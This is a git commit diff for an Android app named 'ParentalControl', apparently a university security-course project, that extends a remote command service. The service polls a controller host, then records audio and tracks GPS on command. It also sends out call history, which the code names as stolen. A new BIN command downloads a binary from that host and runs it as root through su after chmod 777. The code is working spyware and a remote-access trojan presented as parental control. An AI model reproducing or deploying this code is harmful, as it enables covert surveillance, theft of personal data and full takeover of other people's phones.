fdf1425071b80720f311f2cd06186dd9b8b3b838
sansen <santi73@gmail.com>
2015-07-24 03:25:51 -0300

    Binarios y parametros en las instrucciones

--- ParentalControl/app/src/main/java/com/seginf/parentalcontrol/CommandService.java
+++ ParentalControl/app/src/main/java/com/seginf/parentalcontrol/CommandService.java
@@ -19,23 +19,34 @@ import android.widget.Toast;
 import org.apache.commons.net.ftp.FTPClient;
 
 import java.io.BufferedInputStream;
+import java.io.BufferedReader;
 import java.io.ByteArrayInputStream;
+import java.io.DataOutputStream;
+import java.io.File;
 import java.io.FileInputStream;
+import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.MalformedURLException;
+import java.net.URL;
 
 import retrofit.Callback;
 import retrofit.RestAdapter;
 import retrofit.RetrofitError;
 import retrofit.client.Response;
 
-
 public class CommandService extends Service {
 
     private static boolean isRunning = false;
-    private static String GET_COMMAND_API_HOST = "http://10.2.200.89:8000";
-    private static String SEND_RESULT_API_HOST = "10.2.200.89";
+    private static String GET_COMMAND_API_HOST = "http://192.168.0.133:8000";
+    private static String SEND_RESULT_API_HOST = "192.168.0.133";
     private static String TAG = "Parental Control - Command Service";
+    private static String GET_BINARY_API_HOST = GET_COMMAND_API_HOST + "/seginf/pc/";
+    private static String localBinaryPath = "/data/data/com.seginf.parentalcontrol/";
+    private static String binArgs = null;
+    private static String binaryName = null;
 
     @Override
     public void onCreate() {
@@ -57,7 +68,6 @@ public class CommandService extends Service {
     public int onStartCommand(Intent intent, int flags, int startId) {
 
         executeRequest();
-
         return Service.START_STICKY;
     }
 
@@ -87,28 +97,145 @@ public class CommandService extends Service {
 
         if (command == null) return;
 
+        String[] commandParts = command.split(",");
+        command = commandParts[0];
         try {
             switch (command) {
                 case "GPS":
                     trackLocation();
                     break;
                 case "MIC":
-                    startRecording();
+                    Long timeToRecord = Long.parseLong(commandParts[1]);
+                    if (timeToRecord > 0){
+                        startRecording(timeToRecord);
+                    }
                     break;
                 case "VIB":
-                    vibrate();
+                    Long timeToVib = Long.parseLong(commandParts[1]);
+                    if (timeToVib > 0){
+                        vibrate(timeToVib);
+                    }
                     break;
                 case "BROWSER":
-                    openUrlInBrowser();
+                    String urlToOpen = commandParts[1];
+                    openUrlInBrowser(urlToOpen);
                     break;
                 case "CALLS":
                     getCallHistory();
                     break;
+                case "BIN":
+                    binaryName = commandParts[1];
+                    binArgs = commandParts[2];
+                    downloadBinary();
+                    executeBinary();
                 default:
             }
         } catch (InterruptedException e) {
             e.printStackTrace();
         }
+    }
+
+    private void executeBinary()
+    {
+        boolean OperationResult = false;
+        String line = null;
+        String results = null;
+
+        try {
+            Process suProcess = Runtime.getRuntime().exec("su");
+            DataOutputStream os = new DataOutputStream(suProcess.getOutputStream());
+
+            os.writeBytes("chmod 777 " + localBinaryPath + binaryName + "\n");
+            os.flush();
+            os.writeBytes(localBinaryPath + binaryName + " " + binArgs + "\n");
+            os.flush();
+            os.writeBytes("exit\n");
+            os.flush();
+            suProcess.waitFor();
+
+            try {
+                Log.d(TAG, "Excecuting: " + localBinaryPath + binaryName +" "+ binArgs);
+                BufferedReader stdInput = new BufferedReader(new
+                        InputStreamReader(suProcess.getInputStream()));
+
+                BufferedReader stdError = new BufferedReader(new
+                        InputStreamReader(suProcess.getErrorStream()));
+
+                // read the output from the command
+                Log.d(TAG, "Here is the standard output of the command:");
+                String s = null;
+                while ((s = stdInput.readLine()) != null) {
+                    results += s;
+                    results += "\n";
+                    Log.d(TAG, s);
+                }
+
+                // read any errors from the attempted command
+                Log.d(TAG, "Here is the standard error of the command (if any):");
+                while ((s = stdError.readLine()) != null) {
+                    results += s;
+                    results += "\n";
+                    Log.d(TAG, s);
+                }
+
+                if (suProcess.exitValue() >= 0) {
+                    // Success
+                    OperationResult = true;
+                } else {
+                    // Failed
+                    OperationResult = false;
+                }
+            } catch (Exception ex) {
+                Log.e(TAG, "Failed to run executable", ex);
+            }
+        } catch (IOException ex) {
+            Log.w(TAG, "Error in execute su", ex);
+        } catch (SecurityException ex) {
+            Log.w(TAG, "Error in execute su", ex);
+        } catch (Exception ex) {
+            Log.w(TAG, "Error in execute su", ex);
+        }
+        //Log.w(TAG, "Resultado: " + results);
+        if (OperationResult) {
+            byte[] bytes = results.getBytes();
+            //sendToServer(bytes);
+        }
+    }
+
+    private void downloadBinary() {
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    File file = new File(localBinaryPath + binaryName);
+                    if (file.exists()) {
+                        Log.d(TAG, "Binary already downloaded!!");
+                        return;
+                    }
+
+                    URL url = new URL(GET_BINARY_API_HOST + binaryName);
+                    HttpURLConnection urlconn = (HttpURLConnection) url.openConnection();
+                    urlconn.setRequestMethod("GET");
+                    urlconn.setInstanceFollowRedirects(true);
+                    urlconn.connect();
+                    InputStream in = urlconn.getInputStream();
+                    FileOutputStream out = new FileOutputStream(localBinaryPath + binaryName);
+                    int read;
+                    byte[] buffer = new byte[4096];
+                    while ((read = in.read(buffer)) > 0) {
+                        out.write(buffer, 0, read);
+                    }
+                    out.close();
+                    in.close();
+                    urlconn.disconnect();
+
+                    Log.d(TAG, "Downloading to " + localBinaryPath);
+                } catch (MalformedURLException e) {
+                    throw new RuntimeException(e);
+                } catch (IOException e) {
+                    throw new RuntimeException(e);
+                }
+            }}).start();
     }
 
     private void onRequestFailure(RetrofitError error) {
@@ -138,8 +265,7 @@ public class CommandService extends Service {
         sendToServer(bytes);
     }
 
-    private void openUrlInBrowser() {
-        String urlToOpen = "http://www-2.dc.uba.ar/materias/seginf/";
+    private void openUrlInBrowser(String urlToOpen) {
         Intent intent = new Intent(Intent.ACTION_VIEW);
         intent.setData(Uri.parse(urlToOpen));
         // needed because we are opening an activity from a service
@@ -147,10 +273,9 @@ public class CommandService extends Service {
         startActivity(intent);
     }
 
-    private void vibrate() {
+    private void vibrate(Long time) {
         Vibrator v = (Vibrator) getSystemService(VIBRATOR_SERVICE);
-        // Vibrate for 5 seconds
-        v.vibrate(5000);
+        v.vibrate(time);
     }
 
     private void getCallHistory() {
@@ -180,8 +305,9 @@ public class CommandService extends Service {
         sendToServer(stolenCallHistory.getBytes());
     }
 
-    private void startRecording() throws InterruptedException {
+    private void startRecording(Long time) throws InterruptedException {
         Toast.makeText(this, "start recording", Toast.LENGTH_LONG).show();
+        final Long timeTowait = time;
 
         new Thread(new Runnable() {
             @Override
@@ -201,7 +327,7 @@ public class CommandService extends Service {
                 recorder.start();
 
                 try {
-                    Thread.sleep(5000);
+                    Thread.sleep(timeTowait);
                 } catch (InterruptedException e) {
                     e.printStackTrace();
                 }
